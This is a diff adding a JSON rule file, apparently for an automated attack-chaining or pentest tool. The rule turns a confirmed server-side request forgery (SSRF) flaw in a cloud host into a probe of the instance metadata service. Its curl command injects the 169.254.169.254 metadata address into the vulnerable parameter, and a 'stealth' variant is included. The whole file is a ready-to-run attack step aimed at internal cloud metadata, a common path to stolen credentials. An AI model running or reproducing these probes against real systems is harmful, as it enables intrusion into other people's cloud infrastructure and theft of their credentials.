@@ -1,0 +1,35 @@
+{
+  "id": "R-VULN-SSRF-CHAIN-001",
+  "name": "Confirmed SSRF in a cloud environment",
+  "category": "vuln",
+  "when": {
+    "all": [
+      {
+        "fact": "class",
+        "op": "contains",
+        "value": "ssrf"
+      },
+      {
+        "fact": "cloud",
+        "op": "eq",
+        "value": true
+      }
+    ]
+  },
+  "then": {
+    "hypothesis": "Probe IMDS metadata through SSRF",
+    "actions": [
+      {
+        "tool": "curl",
+        "cmd": "curl -sS -m 10 -A '{ua}' '{ssrf_url}?{ssrf_param}=http://169.254.169.254/latest/meta-data/'",
+        "cmd_stealth": "curl -sS -m 5 -A '{ua}' '{ssrf_url}?{ssrf_param}=http://169.254.169.254/latest/meta-data/'",
+        "obs_url": "{ssrf_url}?{ssrf_param}=http://169.254.169.254/latest/meta-data/"
+      }
+    ],
+    "on_hit_class": "ssrf.cloud_imds",
+    "priority": {
+      "impact": 0.9,
+      "cost": 0.15
+    }
+  }
+}
